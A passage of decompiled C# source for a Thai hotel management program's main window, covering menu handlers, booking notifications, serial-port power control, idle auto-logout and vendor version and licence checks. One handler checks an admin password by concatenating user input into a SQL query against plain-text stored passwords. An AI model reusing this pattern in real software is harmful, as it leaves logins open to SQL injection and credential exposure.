			Module1.connect("delete from HT_Room_Status");
			Module1.connect("update HT_Rooms set room_book_ds='',Room_Book='',Room_Book_Name='',Room_Book_Time='',Room_Use_Count=0,Room_Manternace='no',Room_Use='no',Room_Clean='no'");
			MessageBox.Show("OK");
		}
	}

	private void ButtonItem40_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmInOutMain.MdiParent = this;
		MyProject.Forms.FrmInOutMain.Show();
		MyProject.Forms.FrmInOutMain.Activate();
	}

	private void ButtonItem42_Click(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmReceiptMain_invoice.MdiParent = this;
		MyProject.Forms.FrmReceiptMain_invoice.Show();
		MyProject.Forms.FrmReceiptMain_invoice.Activate();
	}

	private void ButtonItem41_Click(object sender, EventArgs e)
	{
		B5.Expanded = true;
	}

	private void ButtonItem43_Click(object sender, EventArgs e)
	{
		B4.Expanded = true;
	}

	private void ButtonItem9_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FormRoomMain.Close();
		MyProject.Forms.FormRoomMain.MdiParent = this;
		MyProject.Forms.FormRoomMain.showFull = true;
		MyProject.Forms.FormRoomMain.Show();
		MyProject.Forms.FormRoomMain.Activate();
	}

	private void ButtonItem23_Click(object sender, EventArgs e)
	{
		FrmManageProduct frmManageProduct = new FrmManageProduct();
		frmManageProduct.ShowDialog();
	}

	private void ButtonItem39_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FormManageOrderCust.ShowDialog();
	}

	private void ButtonItem45_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FormManageOrderCustDown.ShowDialog();
	}

	private void ButtonItem47_Click(object sender, EventArgs e)
	{
		FrmSETCsuTypeMain frmSETCsuTypeMain = new FrmSETCsuTypeMain();
		frmSETCsuTypeMain.ShowDialog();
	}

	private void ButtonItem49_Click(object sender, EventArgs e)
	{
		Process.Start(Module1.Path_Program + "HOTEL.exe");
		Close();
	}

	private void ButtonItem20_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmUser.ShowDialog();
	}

	private void ButtonItem50_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem48_Click_1(object sender, EventArgs e)
	{
	}

	private void ButtonItem51_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem52_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem53_Click(object sender, EventArgs e)
	{
		MyProject.Forms.ReportCustChange.ShowDialog();
	}

	private void ButtonItem54_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem56_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem57_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem58_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FormRoomMainClean.Close();
		MyProject.Forms.FormRoomMainClean.MdiParent = this;
		MyProject.Forms.FormRoomMainClean.Show();
		MyProject.Forms.FormRoomMainClean.Activate();
	}

	private void ButtonItem73_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportImcome.ShowDialog();
	}

	private void ButtonItem74_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportImcome2.ShowDialog();
	}

	private void ButtonItem75_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportShift.ShowDialog();
	}

	private void ButtonItem76_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportShiftCash.ShowDialog();
	}

	private void ButtonItem48_Click(object sender, EventArgs e)
	{
		MyProject.Forms.login.Pass.Text = "";
		MyProject.Forms.login.Pass.Focus();
		MyProject.Forms.login.ShowDialog();
		if (!MyProject.Forms.login.ISOK)
		{
			Close();
			return;
		}
		if (!Module1.HouseWifeMode)
		{
			ButtonItem9_Click(null, null);
			return;
		}
		Hide();
		MyProject.Forms.FormRoomMainClean.ShowDialog();
		Close();
	}

	private void B12_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmDueBill.ShowDialog();
	}

	private void ButtonItem5_Click_1(object sender, EventArgs e)
	{
		R11.Expanded = true;
	}

	private void ButtonItem6_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FrmCuponMain.MdiParent = this;
		MyProject.Forms.FrmCuponMain.Show();
		MyProject.Forms.FrmCuponMain.Activate();
	}

	private void ButtonItem9_Click_1(object sender, EventArgs e)
	{
		R13.Expanded = true;
	}

	private void ButtonItem101111_Click(object sender, EventArgs e)
	{
		R14.Expanded = true;
	}

	private void ButtonItem101_Click(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmBookMain.MdiParent = this;
		MyProject.Forms.FrmBookMain.Show();
		MyProject.Forms.FrmBookMain.Activate();
	}

	private void ribbonControl1_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem_0_Click(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmBookMain2.MdiParent = this;
		MyProject.Forms.FrmBookMain2.Show();
		MyProject.Forms.FrmBookMain2.Activate();
	}

	private void RibbonTabItem4_Click(object sender, EventArgs e)
	{
	}

	private void ribbonTabItem1_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem13_Click_1(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		FrmAddSale2_Credit frmAddSale2_Credit = new FrmAddSale2_Credit();
		frmAddSale2_Credit.ShowDialog();
	}

	private void ButtonItem21_Click_1(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmSaleMain2.MdiParent = this;
		MyProject.Forms.FrmSaleMain2.Show();
		MyProject.Forms.FrmSaleMain2.Activate();
	}

	private void ButtonItem28_Click_1(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmPayDebt.MdiParent = this;
		MyProject.Forms.FrmPayDebt.Show();
		MyProject.Forms.FrmPayDebt.Activate();
	}

	private void ButtonItem29_Click_1(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmPayDebt2.MdiParent = this;
		MyProject.Forms.FrmPayDebt2.Show();
		MyProject.Forms.FrmPayDebt2.Activate();
	}

	private void ButtonItem5_Click_2(object sender, EventArgs e)
	{
	}

	private void ButtonItem9_Click_2(object sender, EventArgs e)
	{
		MyProject.Forms.FormReportAll.ShowDialog();
	}

	private void ButtonItem9_Click_3(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmSearchBook.MdiParent = this;
		MyProject.Forms.FrmSearchBook.Show();
		MyProject.Forms.FrmSearchBook.Activate();
	}

	private void ButtonItem32_Click_2(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReceiptInvoice.MdiParent = this;
		MyProject.Forms.FrmReceiptInvoice.Show();
		MyProject.Forms.FrmReceiptInvoice.Activate();
	}

	private void ButtonItem34_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FormRoomMain_ViewBook.Close();
		MyProject.Forms.FormRoomMain_ViewBook.Show();
	}

	private void TimerOnoff_Tick(object sender, EventArgs e)
	{
		TimerOnoff.Enabled = false;
		if (URL_ON_OFF.Items.Count != 0)
		{
			Label1.Text = Conversions.ToString(checked(Conversions.ToInteger(Label1.Text) + 1));
			string text = URL_ON_OFF.Items[0].SubItems[0].Text;
			LabelStatus.Text = "PWR (" + Conversions.ToString(URL_ON_OFF.Items.Count) + ") : " + text;
			LabelStatus.ForeColor = Color.MidnightBlue;
			URL_ON_OFF.Items[0].Remove();
			try
			{
				WebBrowser1.Url = new Uri(text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void WebBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		try
		{
			if (Label100.Text.Length >= 1500)
			{
				Label100.Text = "";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Label label = Label100;
		label.Text = label.Text + Strings.Format(DateTime.Now, "HH:mm:ss") + " ทำ Login " + e.Url.OriginalString + " เหล\u0e37อ " + Conversions.ToString(Module1.LOGIN_URL.Count) + "\r\n\r\n";
		if (Module1.LOGIN_URL.Count != 0)
		{
			TimerOnoff.Enabled = false;
			loadLogin();
		}
		else
		{
			TimerOnoff.Enabled = true;
		}
	}

	private void ButtonItem36_Click_1(object sender, EventArgs e)
	{
		if (WebBrowser1.Visible)
		{
			WebBrowser1.Visible = false;
			URL_ON_OFF.Visible = false;
			URL_ON_OFF_SERIALS.Visible = false;
			Label100.Visible = false;
		}
		else
		{
			WebBrowser1.Visible = true;
			URL_ON_OFF.Visible = true;
			URL_ON_OFF_SERIALS.Visible = true;
			Label100.Visible = true;
		}
	}

	private void ButtonItem37_Click_1(object sender, EventArgs e)
	{
		if (MessageBox.Show("กร\u0e38ณาป\u0e34ดโปรแกรมท\u0e31\u0e49งหมดก\u0e48อนอ\u0e31บเดท ค\u0e38ณต\u0e49องการอ\u0e31บเดทโปรแกรมหร\u0e37อไม\u0e48", "อ\u0e31บเดทโปรแกรม", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
		{
			MyProject.Forms.FrmUpdate.ShowDialog();
		}
	}

	private void ButtonItem37_Click_3(object sender, EventArgs e)
	{
		MyProject.Forms.AboutBox1.ShowDialog();
	}

	private void SerialPort1_DataReceived(object sender, SerialDataReceivedEventArgs e)
	{
		object right = SerialPort1.ReadExisting();
		TimerOnoff.Enabled = true;
		LabelItem3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("  SerialPort : ", right), " Received. "));
	}

	private void TimerSerials_Tick(object sender, EventArgs e)
	{
		if (URL_ON_OFF_SERIALS.Items.Count == 0)
		{
			return;
		}
		object left = "";
		try
		{
			if (!SerialPort1.IsOpen)
			{
				SerialPort1.PortName = Module1.POWER_PORT;
				SerialPort1.Encoding = Encoding.GetEncoding(1252);
				SerialPort1.Open();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			left = ex2.Message;
			ProjectData.ClearProjectError();
		}
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(URL_ON_OFF_SERIALS.Items[0].SubItems[0].Text);
			SerialPort1.Write(bytes, 0, bytes.Length);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			left = ex4.Message;
			ProjectData.ClearProjectError();
		}
		LabelStatus.Text = "PWR (" + Conversions.ToString(URL_ON_OFF_SERIALS.Items.Count) + ") : " + URL_ON_OFF_SERIALS.Items[0].SubItems[0].Text;
		LabelStatus.ForeColor = Color.MidnightBlue;
		URL_ON_OFF_SERIALS.Items[0].Remove();
		try
		{
			SerialPort1.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.ConditionalCompareObjectNotEqual(left, "", TextCompare: false))
		{
			LabelStatus.ForeColor = Color.Red;
		}
	}

	private void ButtonItem39_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FrmPayMain.MdiParent = this;
		MyProject.Forms.FrmPayMain.Show();
		MyProject.Forms.FrmPayMain.Activate();
	}

	private void ButtonItem41_Click_1(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmPayDebt.MdiParent = this;
		MyProject.Forms.FrmPayDebt.Show();
		MyProject.Forms.FrmPayDebt.Activate();
	}

	private void ButtonItem42_Click_1(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmPayDebt2.MdiParent = this;
		MyProject.Forms.FrmPayDebt2.Show();
		MyProject.Forms.FrmPayDebt2.Activate();
	}

	private void B11_2_Click(object sender, EventArgs e)
	{
		B11_2.Expanded = true;
	}

	private void ButtonItem40_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FrmUseCount.ShowDialog();
	}

	private void ButtonItem45_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.ReportDays.ShowDialog();
	}

	private void ButtonItem47_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.ReportCustIn.ShowDialog();
	}

	private void ButtonItem50_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.ReportCustOut.ShowDialog();
	}

	private void ButtonItem51_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.ReportCustDays.ShowDialog();
	}

	private void ButtonItem52_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.ReportCustChange.ShowDialog();
	}

	private void ButtonItem43_Click_1(object sender, EventArgs e)
	{
		ButtonItem43.Expanded = true;
	}

	private void ButtonItem53_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportHousewife.ShowDialog();
	}

	private void ButtonItem56_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportBook.ShowDialog();
	}

	private void ButtonItem57_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportBook2.ShowDialog();
	}

	private void ButtonItem58_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportPaybooking.ShowDialog();
	}

	private void ButtonItem55_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportCancel.ShowDialog();
	}

	private void ButtonItem47_Click_2(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportProducts.ShowDialog();
	}

	private void ButtonItem50_Click_2(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportProductsSale.ShowDialog();
	}

	private void ButtonItem50_Click_3(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportrepair.ShowDialog();
	}

	private void ButtonItem20_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.ReportDebt.ShowDialog();
	}

	private void ButtonItem20_Click_2(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportMudjumRec.ShowDialog();
	}

	private void ButtonItem50_Click_4(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportMudjumBack.ShowDialog();
	}

	private void ButtonItem11_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FormReportAll2.ShowDialog();
	}

	private void ButtonItem5_Click_3(object sender, EventArgs e)
	{
		ButtonItem5.Expanded = true;
	}

	private void ButtonItem45_Click_2(object sender, EventArgs e)
	{
		ButtonItem45.Expanded = true;
	}

	private void ButtonItem12_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.ReportTax.ShowDialog();
	}

	private void ButtonItem12_Click_2(object sender, EventArgs e)
	{
		MyProject.Forms.frmTimeTable.ShowDialog();
	}

	private void ButtonItem30_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.ReportContnueRoom.ShowDialog();
	}

	private void ButtonItem46_Click(object sender, EventArgs e)
	{
		FrmSETTimeContnue frmSETTimeContnue = new FrmSETTimeContnue();
		frmSETTimeContnue.ShowDialog();
	}

	private void ButtonItem47_Click_3(object sender, EventArgs e)
	{
		MyProject.Forms.ReportCleanRoom.ShowDialog();
	}

	private void ButtonItem51_Click_2(object sender, EventArgs e)
	{
		MyProject.Forms.ReportCustOutToday.ShowDialog();
	}

	private void TimerMouse_Tick(object sender, EventArgs e)
	{
		GetCursorPos(ref mousepos);
		if ((Operators.CompareString(string_0, "X." + Conversions.ToString(mousepos.X) + " Y." + Conversions.ToString(mousepos.Y), TextCompare: false) != 0) & ACT & !ISOVER)
		{
			string_0 = "X." + Conversions.ToString(mousepos.X) + " Y." + Conversions.ToString(mousepos.Y);
			countMouse = default(decimal);
		}
		else
		{
			countMouse = decimal.Add(countMouse, 1m);
			if (decimal.Compare(countMouse, new decimal(Module1.AutoLogout)) > 0)
			{
				ISOVER = true;
				if (ACT)
				{
					TimerMouse.Enabled = false;
					ISOVER = false;
					countMouse = default(decimal);
					MyProject.Forms.login.User.Text = "";
					MyProject.Forms.login.Pass.Text = "";
					MyProject.Forms.login.User.Focus();
					MyProject.Forms.login.ShowDialog();
					if (!MyProject.Forms.login.ISOK)
					{
						Close();
					}
				}
			}
		}
		LabelItem4.Text = "Mose: " + Conversions.ToString(mousepos.X) + " x " + Conversions.ToString(mousepos.Y) + " TimeOut: " + Conversions.ToString(checked(Module1.AutoLogout - Convert.ToInt32(countMouse)));
	}

	private void ButtonNotification_Click(object sender, EventArgs e)
	{
		ButtonNotification.Expanded = true;
	}

	private void TimerNotifly_Tick(object sender, EventArgs e)
	{
		if (ButtonNotification.ForeColor == Color.Red)
		{
			ButtonNotification.Image = Resources._01__4_;
			Color foreColor = default(Color);
			ButtonNotification.ForeColor = foreColor;
		}
		else
		{
			ButtonNotification.Image = Resources._04__4_;
			ButtonNotification.ForeColor = Color.Red;
		}
	}

	private void TimerCheckNotify_Tick(object sender, EventArgs e)
	{
		CHK_NOTIFLY();
	}

	public void CHK_NOTIFLY()
	{
		TimerCheckNotify.Enabled = false;
		TimerNotifly.Enabled = false;
		ButtonNotification.Text = "ไม\u0e48ม\u0e35การแจ\u0e49งเต\u0e37อน";
		ButtonNotification.Image = Resources._10__5_;
		Color foreColor = default(Color);
		ButtonNotification.ForeColor = foreColor;
		ribbonControl1.Refresh();
		checked
		{
			int num = ButtonNotification.SubItems.Count - 1;
			int num2 = 1;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				ButtonNotification.SubItems.RemoveAt(1);
				num2++;
			}
			if (!Module1.bool_1)
			{
				TimerCheckNotify.Enabled = true;
				return;
			}
			DataSet dataSet = Module1.connect("select * FROM HT_Book_H WHERE (Book_Status = 'จอง') AND (Book_Price_Pay <= 0) AND (Book_Notify_Day > 0) AND (Book_Notify_Note <> 'ไม\u0e48แจ\u0e49งเต\u0e37อน' OR Book_Notify_Note IS NULL) AND (Book_Date_in >= DATEADD(day, -1, GETDATE())) AND (Book_Date_in < DATEADD(day, Book_Notify_Day, GETDATE())) order by Book_Date_in ");
			int num5 = dataSet.Tables[0].Rows.Count - 1;
			int num6 = 0;
			while (true)
			{
				int num7 = num6;
				int num4 = num5;
				if (num7 > num4)
				{
					break;
				}
				LabelItem labelItem = new LabelItem();
				labelItem.BackColor = Color.FromArgb(221, 231, 238);
				labelItem.BorderSide = eBorderSide.Bottom;
				labelItem.BorderType = eBorderType.SingleLine;
				labelItem.ForeColor = Color.FromArgb(0, 21, 110);
				labelItem.Name = Conversions.ToString(dataSet.Tables[0].Rows[num6]["Book_id"]);
				labelItem.PaddingBottom = 1;
				labelItem.PaddingLeft = 10;
				labelItem.PaddingTop = 1;
				Size size = new Size(500, 200);
				labelItem.Size = size;
				labelItem.SingleLineColor = Color.FromArgb(197, 197, 197);
				labelItem.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("รายการจองเลขท\u0e35\u0e48 <font color=\"#008103\"><b>", dataSet.Tables[0].Rows[num6]["Book_id"]), " </b></font>"), "(<font color=\"#008103\">"), Strings.Format(RuntimeHelpers.GetObjectValue(dataSet.Tables[0].Rows[num6]["Book_date"]), "dd/MM/yyyy")), "</font>)"), " ว\u0e31นท\u0e35\u0e48เข\u0e49าพ\u0e31ก [<font color=\"#C500C0\"><b>"), Strings.Format(RuntimeHelpers.GetObjectValue(dataSet.Tables[0].Rows[num6]["Book_date_in"]), "dd/MM/yyyy")), "</b></font> ออก <font color=\"#C500C0\"><b>"), Strings.Format(RuntimeHelpers.GetObjectValue(dataSet.Tables[0].Rows[num6]["Book_date_out"]), "dd/MM/yyyy")), "</b></font>]&nbsp;"));
				LabelItem labelItem2 = labelItem;
				labelItem2.Text = Conversions.ToString(Operators.ConcatenateObject(labelItem2.Text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<br>ช\u0e37\u0e48อ ", dataSet.Tables[0].Rows[num6]["Book_Cust_Name"]), " "), dataSet.Tables[0].Rows[num6]["Book_Cust_Name2"]), " </br>")));
				if (Operators.CompareString(Strings.Trim(Conversions.ToString(dataSet.Tables[0].Rows[num6]["Book_Cust_Tel"])), "", TextCompare: false) != 0)
				{
					labelItem2 = labelItem;
					labelItem2.Text = Conversions.ToString(Operators.ConcatenateObject(labelItem2.Text, Operators.ConcatenateObject(Operators.ConcatenateObject("<br>โทร ", dataSet.Tables[0].Rows[num6]["Book_Cust_Tel"]), " </br>")));
				}
				labelItem2 = labelItem;
				labelItem2.Text = labelItem2.Text + "<br>ค\u0e49างชำระ <font color=\"#C50000\">" + Strings.Format(RuntimeHelpers.GetObjectValue(dataSet.Tables[0].Rows[num6]["Book_Price_Total"]), "#,##0.00") + "</font></br>";
				labelItem.Cursor = Cursors.Hand;
				labelItem.MouseEnter += Notifly_OVER;
				labelItem.MouseLeave += Notifly_Leave;
				labelItem.Click += Notifly_Click;
				ButtonNotification.SubItems.Add(labelItem);
				num6++;
			}
			if (dataSet.Tables[0].Rows.Count != 0)
			{
				ButtonNotification.Text = "ม\u0e35การแจ\u0e49งเต\u0e37อน " + Conversions.ToString(dataSet.Tables[0].Rows.Count) + " รายการ";
				ButtonNotification.Image = Resources._01__4_;
				ButtonNotification.Enabled = true;
				TimerNotifly.Enabled = true;
			}
			else
			{
				ButtonNotification.Enabled = false;
			}
			TimerCheckNotify.Enabled = true;
		}
	}

	private void Notifly_OVER(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(sender, null, "BackColor", new object[1] { Color.LightYellow }, null, null);
	}

	private void Notifly_Leave(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(sender, null, "BackColor", new object[1] { Color.FromArgb(221, 231, 238) }, null, null);
	}

	private void Notifly_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmShowBookNotify.Label2.Text = Conversions.ToString(NewLateBinding.LateGet(sender, null, "name", new object[0], null, null, null));
		MyProject.Forms.FrmShowBookNotify.ShowDialog();
		if (MyProject.Forms.FrmShowBookNotify.ISOK)
		{
			CHK_NOTIFLY();
		}
	}

	private void ButtonItem52_Click_2(object sender, EventArgs e)
	{
		MyProject.Forms.FrmSettingsSMS.ShowDialog();
	}

	private void ButtonItem53_Click_2(object sender, EventArgs e)
	{
		FormSMSSendManual formSMSSendManual = new FormSMSSendManual();
		formSMSSendManual.ShowDialog();
	}

	private void WebBrowser2_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		string documentText = WebBrowser2.DocumentText;
		if (documentText.IndexOf("[PVER]") != -1)
		{
			if (Operators.CompareString(Strings.Trim(documentText.Replace("[PVER]", "")), Module1.ProgramVersion, TextCompare: false) == 0)
			{
				ButtonItem_Version.Text = " ร\u0e38\u0e48น " + Module1.ProgramVersion + " เป\u0e47นป\u0e31จจ\u0e38บ\u0e31น";
				ButtonItem_Version.Image = Resources._10__6_;
				Color foreColor = default(Color);
				ButtonItem_Version.ForeColor = foreColor;
			}
			else
			{
				ButtonItem_Version.Text = " พบโปรแกรมร\u0e38\u0e48นใหม\u0e48 " + documentText.Replace("[PVER]", "") + " คล\u0e34\u0e4aกเพ\u0e37\u0e48ออ\u0e31บเดท";
				ButtonItem_Version.Image = Resources._50;
				ButtonItem_Version.ForeColor = Color.Red;
			}
			ribbonControl1.Refresh();
		}
	}

	private void TimerChkVer_Tick(object sender, EventArgs e)
	{
		try
		{
			WebBrowser2.Url = new Uri(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("http://www.kpsystem.co.th/version_hotel.php?comid=", Module1.COM_ID), "&PMODE="), Module1.P_MODE), "&PVER="), Module1.ProgramVersion), "&PCOMPANY="), Module1.Company_Name)));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ButtonItem_Version_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmUpdate.ShowDialog();
	}

	private void WebBrowser1_Navigating(object sender, WebBrowserNavigatingEventArgs e)
	{
	}

	private void ButtonItem54_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportPower.ShowDialog();
	}

	private void ButtonItem59_Click(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		FrmCheckOut frmCheckOut = new FrmCheckOut();
		frmCheckOut.WindowState = FormWindowState.Maximized;
		frmCheckOut.ShowDialog();
	}

	private void ButtonItem60_Click(object sender, EventArgs e)
	{
		FrmSETsale frmSETsale = new FrmSETsale();
		frmSETsale.ShowDialog();
	}

	private void Bin2_Click(object sender, EventArgs e)
	{
	}

	private void R11_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem55_Click_1(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportSale1.ShowDialog();
	}

	private void ButtonItem61_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportSale2.ShowDialog();
	}

	private void ButtonItem62_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportRR4.ShowDialog();
	}

	private void ButtonItem63_Click(object sender, EventArgs e)
	{
		MyProject.Forms.ReportCustOutToday2.ShowDialog();
	}

	private void ButtonItem64_Click(object sender, EventArgs e)
	{
		MyProject.Forms.ReportContnueRoom2.ShowDialog();
	}

	private void ButtonItem65_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportCoupon.ShowDialog();
	}

	private void ButtonItem67_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReportCancelSale.ShowDialog();
	}

	private void ButtonItem68_Click(object sender, EventArgs e)
	{
		FrmSETBranch frmSETBranch = new FrmSETBranch();
		frmSETBranch.ShowDialog();
	}

	private void TimerDate_Tick(object sender, EventArgs e)
	{
		if (DateTime.Compare(dateNOW, DateTime.Now) <= 0)
		{
			dateNOW = DateTime.Now;
			return;
		}
		Module1.LOG("ว\u0e31นท\u0e35\u0e48เปล\u0e35\u0e48ยน จาก" + Strings.Format(dateNOW, "dd-MM-yy HH:mm:ss") + " เป\u0e47น " + Strings.Format(DateTime.Now, "dd-MM-yy HH:mm:ss"));
		Close();
	}

	private void ButtonItem69_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FormPass.ShowDialog();
		if (Operators.CompareString(MyProject.Forms.FormPass.TextBox1.Text, "", TextCompare: false) != 0)
		{
			DataSet dataSet = Module1.connect("select * from TB_MRP_EMPLOYEE where emp_level='admin' and emp_password='" + MyProject.Forms.FormPass.TextBox1.Text + "'");
			if (dataSet.Tables[0].Rows.Count == 0)
			{
				MessageBox.Show("รห\u0e31สผ\u0e48านไม\u0e48ถ\u0e39กต\u0e49อง");
				Module1.LOG(Conversions.ToString(Operators.ConcatenateObject("เข\u0e49าโหมดหล\u0e31งบ\u0e49าน ไม\u0e48สำเร\u0e47จ (รห\u0e31สผ\u0e48านผ\u0e34ด) : ", Module1.loginName)));
			}
			else
			{
				Module1.LOG("เข\u0e49าโหมดหล\u0e31งบ\u0e49านเสร\u0e47จเร\u0e35ยบร\u0e49อย");
				MyProject.Forms.FormLog.ShowDialog();
			}
		}
	}

	private void ButtonItem70_Click(object sender, EventArgs e)
	{
		MyProject.Forms.frmReg.ShowDialog();
	}

	private void TimerWeb_Tick(object sender, EventArgs e)
	{
		try
		{
			WebBrowserBlock.Url = new Uri("http://www.kpsystem.co.th/chk_hotel.php");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void WebBrowserBlock_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		string documentText = WebBrowserBlock.DocumentText;
		if (!Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(Module1.COM_ID, null, "Length", new object[0], null, null, null), 5, TextCompare: false))
		{
			return;
		}
		object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Module1.COM_ID) };
		bool[] array2 = new bool[1] { true };
		object left = NewLateBinding.LateGet(documentText, null, "IndexOf", array, null, null, array2);
		if (array2[0])
		{
			Module1.COM_ID = (string)RuntimeHelpers.GetObjectValue(array[0]);
		}
		if (Operators.ConditionalCompareObjectNotEqual(left, -1, TextCompare: false))
		{
